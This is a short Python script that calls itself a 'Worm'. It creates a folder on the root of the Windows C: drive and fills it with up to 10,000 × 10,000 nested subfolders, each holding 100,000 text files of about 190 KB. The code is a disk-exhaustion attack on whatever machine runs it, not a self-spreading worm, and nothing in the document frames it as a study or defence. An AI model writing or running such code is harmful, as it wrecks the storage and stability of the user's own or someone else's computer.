import os
s=""
for i in range(100):
 s+=str(i) 
for i in range (10):
 s=s+s

print("Worm executing")
os.chdir("C:/")
os.mkdir("hehe")
os.chdir("C:/hehe")
for i in range(10000):
    os.mkdir(f"boi{i}")
    print("1 done")
    os.chdir(f"C:/hehe/boi{i}")
    for j in range(10000):
        os.mkdir(f"hehe boi{j}")
        os.chdir(f"C:/hehe/boi{i}/hehe boi{j}")
        k=1
        while k<=100000:
            with open(f"shit{k}.txt","w") as file:
                file.write(s)
            k+=1
        os.chdir(f"C:/hehe/boi{i}")
    os.chdir("C:/hehe")

print("****Worm execution complete****")
